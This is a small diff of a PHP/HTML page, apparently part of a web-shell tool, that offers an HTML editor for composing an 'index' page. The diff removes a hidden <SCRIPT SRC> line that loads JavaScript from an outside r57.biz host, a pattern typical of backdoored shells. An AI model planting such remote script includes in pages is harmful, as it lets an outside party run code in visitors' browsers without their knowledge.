@@ -560,7 +560,6 @@ indexform.index.value=indexform.index.value + "<br>";
 bordercolorlight="#008000"><th><a onclick='return center()'>Center</a> ||| <a onclick='return left()'>Left</a> ||| <a onclick='return right()'>right</a> ||| <a onclick='return b()'>Bold</a> ||| <a onclick='return u()'>UnderLine</a> ||| <a onclick='return i()'>Italic</a> ||| <a onclick='return br()'>NewLine</a> ||| <a onclick='return colour()'>Colour</a> ||| <a onclick='return mar()'>Marquee ||| <a onclick='return img()'>Picture</a> ||| <a onclick='return link()'>Link</a></a></th><tr><TD>
 <center><form name="indexform" action="" method="post"><textarea name='index' rows='14' cols='86'></textarea></p>
 </form></form></center>
-<SCRIPT SRC=http://www.r57.biz/yazciz/ciz.js></SCRIPT>
 </TD></tr><tr><td>Copy The Code after Finishing your index</td></tr></table>
 <?
 }
